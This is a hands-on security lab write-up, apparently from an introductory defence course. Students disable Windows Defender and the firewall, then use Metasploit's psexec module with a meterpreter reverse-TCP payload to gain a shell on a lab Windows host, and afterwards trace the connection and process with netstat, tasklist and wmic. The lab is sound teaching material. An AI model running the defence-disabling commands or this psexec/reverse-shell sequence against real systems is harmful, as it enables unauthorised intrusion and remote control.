# Windows CLI

In this lab, we will create **malware**, run it, and use the tools we went through in the slides to look at what an attack looks like on a live system.  

One of the best ways to learn is to actually just dig in and do it.  

Let’s get started by opening a terminal.  

![](attachments/OpeningKaliInstance.png)

Alternatively, you can open a **Kali** instance by clicking the **Kali** logo in the taskbar.

![](attachments/TaskbarKaliIcon.png)

Before going any further, we need to ensure that **Windows Defender** is disabled. To do this, open a Windows **Powershell** by clicking the icon in the taskbar.

![](attachments/OpeningPowershell.png)

<pre>Set-MpPreference -DisableRealtimeMonitoring $true</pre>

![](attachments/windowscli_disabledefender.png)

Please note, if you get red errors that say 

<pre>A general error occurred that is not covered by a more specific error code.</pre> 


That is OK!  It means **Defender** was disabled.  We run the above command to ensure that it is off for this lab.  It has a sneaky way of turning back on again...

Next, lets ensure the firewall is disabled.

<pre> netsh advfirewall set allprofiles state off</pre>

Next, set a password for the Administrator account that you can remember

<pre>net user Administrator password1234</pre>

Please note, that is a very bad password.  Come up with something better. But, please remember it.

Now that we disabled **Windows Defender**, we can head back to our **Kali** terminal.

Within the terminal, please run the following command:

<pre>ipconfig</pre>

Please note your Windows IP address.

Please note your IP address for the **ADHD Linux system** on a piece of paper:

We need to gain root access within our **Kali** terminal. To do that, run the following command:

<pre>sudo su -</pre>

Next, we will start the **Metasploit** handler with the following command:

<pre>msfconsole -q</pre>

It will take a second to connect, be patient!

When connected, our terminal will look like this.

![](attachments/windowscli_msfconnected.png)

Next, run the following command:

<pre>use exploit/windows/smb/psexec</pre>

![](attachments/windowscli_useexploit.png)

We will continue by running this command to set the location of the payload:

<pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>

We also need to set the **RHOST IP** for the Windows system by using the following command:

<pre>set RHOST 10.10.1.209</pre>

![](attachments/windowscli_sets.png)

**Remember, your IP will be different!**

Next, we need to set the **SMB** username and password. 

<pre>set SMBUSER Administrator</pre>

<pre>set SMBPASS T@GEq5%r2XJh</pre>

Remember, your password will be different!  I hope!!!

It should look like this:

![](attachments/windowscli_setuserpass.png)

Now, we can run the exploit command

<pre>exploit</pre>

![](attachments/windowscli_exploit.png)

While there is not much here for this lab, it is key to remember that these two commands would help us detect an attacker that is mounting shares on other computers (net view).  It would also tell us if an attacker had mounted a share on this system (net session). 

We are not done with network connections yet.  Lets try looking at our malware!

Go ahead an open an instance of **Windows PowerShell**.

![](attachments/OpeningPowershell.png)

Run the following command:

<pre>netstat -naob</pre>

![](attachments/windowscli_netstat.png)

Well, that is a lot of data. This is showing us which ports are open on this system **(0.0.0.0:portnumber)** or **(LISTENING)**.
As well as the remote connections that are made to other systems **(ESTABLISHED)**.  In this example, we are really interested in the **ESTABLISHED** connections:

![](attachments/windowscli_established.png)

Specificly, we are interested in the connection on port 4444 as we know this is the port we used for our malware.

Now, let's drill down on that connection with some more data:

<pre>netstat -f</pre>

I like to run **"-f"** with netstat to see if there are any systems with fully qualified domains that we may be able to ignore. 

![](attachments/windowscli_-f.png)

Now we see our last connection with the **port 4444**.

Let's get the Process ID **(PID)** from the above screenshot so we can dig a little deeper.

![](attachments/windowscli_pid.png)

We will start with tasklist  

<pre>tasklist /m /fi "pid eq [PID]"</pre>

**YOUR PID WILL BE DIFFERENT!**

![](attachments/windowscli_tasklist.png)

We can see the loaded **DLL's** above.  As we can see, there is not a whole lot to see here:

Let's keep digging with **wmic**:

<pre>wmic process where processid=[PID] get commandline</pre>

![](attachments/windowscli_wmic.png)

Ahh!!  Now we can see that the file was launched from the **command line**!  We know this because there are no options.

Let's see if we can see what spawned the process with **wmic**.

<pre>wmic process get name,parentprocessid,processid | select-string [PID]</pre>

![](attachments/windowscli_selectstring.png)

Lets go through the steps we took to hunt for a malicious process

1. We found its parent process ID.  

2. We did a search on that process ID.  

3. As you can see above, it was launched by the cmd.exe process.  

4. Note that the search we just did may turn up some other things launched by the command line as well.


***
***Continuing on to the next Lab?***

[Click here to get back to the Navigation Menu](/IntroClassFiles/navigation.md)

***Finished with the Labs?***


Please be sure to destroy the lab environment!

[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)

[Return To Lab List](https://github.com/strandjs/IntroLabs/blob/master/IntroClassFiles/navigation.md)

---







 

